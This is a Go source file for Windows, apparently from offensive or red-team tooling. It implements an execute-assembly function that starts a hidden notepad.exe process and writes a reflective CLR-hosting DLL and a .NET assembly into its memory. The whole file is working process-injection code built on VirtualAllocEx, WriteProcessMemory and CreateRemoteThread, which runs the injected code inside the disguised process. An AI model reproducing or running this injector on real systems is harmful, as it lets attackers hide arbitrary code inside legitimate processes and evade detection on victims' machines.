// +build windows

package assembly

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"unsafe"
)

const (
	BobLoaderOffset     = 0x00000af0
	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MEM_COMMIT          = 0x001000
	MEM_RESERVE         = 0x002000
	MAX_ASSEMBLY_LENGTH = 1025024
)

var (
	kernel32               = syscall.MustLoadDLL("kernel32.dll")
	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
)

func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
	r1, _, e1 := procVirtualAllocEx.Call(
		uintptr(process),
		addr,
		uintptr(size),
		uintptr(allocType),
		uintptr(protect))

	if int(r1) == 0 {
		return r1, os.NewSyscallError("VirtualAllocEx", e1)
	}
	return r1, nil
}

func writeProcessMemory(process syscall.Handle, addr uintptr, buf unsafe.Pointer, size uint32) (uint32, error) {
	var nLength uint32
	r1, _, e1 := procWriteProcessMemory.Call(
		uintptr(process),
		addr,
		uintptr(buf),
		uintptr(size),
		uintptr(unsafe.Pointer(&nLength)))

	if int(r1) == 0 {
		return nLength, os.NewSyscallError("WriteProcessMemory", e1)
	}
	return nLength, nil
}

func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, stackSize uint32, startAddress, parameter uintptr, creationFlags uint32) (syscall.Handle, uint32, error) {
	var threadID uint32
	r1, _, e1 := procCreateRemoteThread.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(sa)),
		uintptr(stackSize),
		startAddress,
		parameter,
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(&threadID)))
	runtime.KeepAlive(sa)
	if int(r1) == 0 {
		return syscall.InvalidHandle, 0, os.NewSyscallError("CreateRemoteThread", e1)
	}
	return syscall.Handle(r1), threadID, nil
}

// ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
// along with a provided .NET assembly to execute.
func ExecuteAssembly(hostingDll, assembly []byte, params string) error {

	if len(assembly) > MAX_ASSEMBLY_LENGTH {
		return fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
	}
	cmd := exec.Command("notepad.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	var stdoutBuf, stderrBuf bytes.Buffer
	stdoutIn, _ := cmd.StdoutPipe()
	stderrIn, _ := cmd.StderrPipe()

	var errStdout, errStderr error
	stdout := io.MultiWriter(os.Stdout, &stdoutBuf)
	stderr := io.MultiWriter(os.Stderr, &stderrBuf)
	cmd.Start()
	pid := cmd.Process.Pid
	// OpenProcess with PROC_ACCESS_ALL
	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return err
	}
	// VirtualAllocEx to allocate a new memory segment into the target process
	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return err
	}
	// WriteProcessMemory to write the reflective loader into the process
	_, err = writeProcessMemory(handle, hostingDllAddr, unsafe.Pointer(&hostingDll[0]), uint32(len(hostingDll)))
	if err != nil {
		return err
	}
	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
	// Total size to allocate = assembly size + 1024 bytes for the args
	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
	assemblyAddr, err := virtualAllocEx(handle, 0, totalSize, MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
	if err != nil {
		return err
	}
	// Padd arguments with 0x00 -- there must be a cleaner way to do that
	paramsBytes := []byte(params)
	padding := make([]byte, 1024-len(params))
	final := append(paramsBytes, padding...)
	// Final payload: params + assembly
	final = append(final, assembly...)
	// WriteProcessMemory to write the .NET assembly + args
	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&final[0]), uint32(len(final)))
	if err != nil {
		return err
	}
	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
	// CreateRemoteThread(DLL addr + offset, assembly addr)
	attr := new(syscall.SecurityAttributes)
	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
	if err != nil {
		return err
	}

	go func() {
		_, errStdout = io.Copy(stdout, stdoutIn)
	}()
	_, errStderr = io.Copy(stderr, stderrIn)

	if errStdout != nil || errStderr != nil {
		log.Fatal("failed to capture stdout or stderr\n")
	}
	outStr, errStr := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
	fmt.Printf("\nout:\n%s\nerr:\n%s\n", outStr, errStr)
	return nil
}
